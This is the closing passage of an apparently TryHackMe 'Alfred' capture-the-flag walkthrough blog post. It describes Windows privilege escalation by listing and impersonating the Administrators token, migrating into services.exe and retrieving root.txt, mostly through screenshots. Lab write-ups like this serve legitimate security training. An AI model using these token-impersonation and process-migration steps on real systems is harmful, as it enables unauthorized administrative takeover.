        data-srcset="https://user-images.githubusercontent.com/60508293/121997459-3e8dce00-cd5f-11eb-913e-8a3715c60f13.png, https://user-images.githubusercontent.com/60508293/121997459-3e8dce00-cd5f-11eb-913e-8a3715c60f13.png 1.5x, https://user-images.githubusercontent.com/60508293/121997459-3e8dce00-cd5f-11eb-913e-8a3715c60f13.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121997459-3e8dce00-cd5f-11eb-913e-8a3715c60f13.png"
        title="image" /></p>
<p>List all tokens then impersonate the Administrators token.</p>
<pre><code>list_tokens -g
</code></pre><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121997745-acd29080-cd5f-11eb-8ec0-9cbb03ad132d.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121997745-acd29080-cd5f-11eb-8ec0-9cbb03ad132d.png, https://user-images.githubusercontent.com/60508293/121997745-acd29080-cd5f-11eb-8ec0-9cbb03ad132d.png 1.5x, https://user-images.githubusercontent.com/60508293/121997745-acd29080-cd5f-11eb-8ec0-9cbb03ad132d.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121997745-acd29080-cd5f-11eb-8ec0-9cbb03ad132d.png"
        title="image" /></p>
<!-- raw HTML omitted -->
<h2 id="8-output-of-guid">8) Output of guid</h2>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121998113-3e420280-cd60-11eb-999e-97928a8edc7c.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121998113-3e420280-cd60-11eb-999e-97928a8edc7c.png, https://user-images.githubusercontent.com/60508293/121998113-3e420280-cd60-11eb-999e-97928a8edc7c.png 1.5x, https://user-images.githubusercontent.com/60508293/121998113-3e420280-cd60-11eb-999e-97928a8edc7c.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121998113-3e420280-cd60-11eb-999e-97928a8edc7c.png"
        title="image" /></p>
<!-- raw HTML omitted -->
<h2 id="9-migrating-and-finding-roottxt">9) Migrating and finding root.txt</h2>
<p>Use the command ps and find the PID of services.exe in red</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121998564-e3f57180-cd60-11eb-8f2e-b773b004afd3.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121998564-e3f57180-cd60-11eb-8f2e-b773b004afd3.png, https://user-images.githubusercontent.com/60508293/121998564-e3f57180-cd60-11eb-8f2e-b773b004afd3.png 1.5x, https://user-images.githubusercontent.com/60508293/121998564-e3f57180-cd60-11eb-8f2e-b773b004afd3.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121998564-e3f57180-cd60-11eb-8f2e-b773b004afd3.png"
        title="image" /></p>
<p>Migrate to services.exe</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121998744-33d43880-cd61-11eb-9f7f-1623c4f6ba20.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121998744-33d43880-cd61-11eb-9f7f-1623c4f6ba20.png, https://user-images.githubusercontent.com/60508293/121998744-33d43880-cd61-11eb-9f7f-1623c4f6ba20.png 1.5x, https://user-images.githubusercontent.com/60508293/121998744-33d43880-cd61-11eb-9f7f-1623c4f6ba20.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121998744-33d43880-cd61-11eb-9f7f-1623c4f6ba20.png"
        title="image" /></p>
<p>Find root.txt and the flag.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121999513-4307b600-cd62-11eb-9ad9-c2934d856c7b.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121999513-4307b600-cd62-11eb-9ad9-c2934d856c7b.png, https://user-images.githubusercontent.com/60508293/121999513-4307b600-cd62-11eb-9ad9-c2934d856c7b.png 1.5x, https://user-images.githubusercontent.com/60508293/121999513-4307b600-cd62-11eb-9ad9-c2934d856c7b.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121999513-4307b600-cd62-11eb-9ad9-c2934d856c7b.png"
        title="image" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121999684-75b1ae80-cd62-11eb-9fa4-6f0ec0771414.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121999684-75b1ae80-cd62-11eb-9fa4-6f0ec0771414.png, https://user-images.githubusercontent.com/60508293/121999684-75b1ae80-cd62-11eb-9fa4-6f0ec0771414.png 1.5x, https://user-images.githubusercontent.com/60508293/121999684-75b1ae80-cd62-11eb-9fa4-6f0ec0771414.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121999684-75b1ae80-cd62-11eb-9fa4-6f0ec0771414.png"
        title="image" /></p>
<h3 id="congratulations-the-room-is-now-complete-hopefully-this-guide-was-helpful-for-anyone-stuck-in-this-room">Congratulations, the room is now complete! Hopefully, this guide was helpful for anyone stuck in this room.</h3>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2021-06-16</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://mondirkb.github.io/posts/alfred-machine/2020-10-11-alfred-machine/" data-title="Alfred" data-via="mondir_kb" data-hashtags="TryHackMe"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://mondirkb.github.io/posts/alfred-machine/2020-10-11-alfred-machine/" data-hashtag="TryHackMe"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://mondirkb.github.io/posts/alfred-machine/2020-10-11-alfred-machine/" data-title="Alfred"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://mondirkb.github.io/posts/alfred-machine/2020-10-11-alfred-machine/" data-title="Alfred"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.0.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://mondirkb.github.io/posts/alfred-machine/2020-10-11-alfred-machine/" data-title="Alfred"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/tryhackme/">TryHackMe</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/doctor-machine/2020-12-01-doctor-machine-htb/" class="prev" rel="prev" title="Doctor machine"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Doctor machine</a>
            <a href="/posts/theme-documentation-bilibili-shortcode/" class="next" rel="next" title="Theme Documentation - bilibili Shortcode">Theme Documentation - bilibili Shortcode<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.68.3">Hugo</a> | Theme - <a href="#" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> .</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">KEBIR MOUNDIR CHEMSEDDINE</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"data":{"id-1":"/home","id-2":"/home"},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
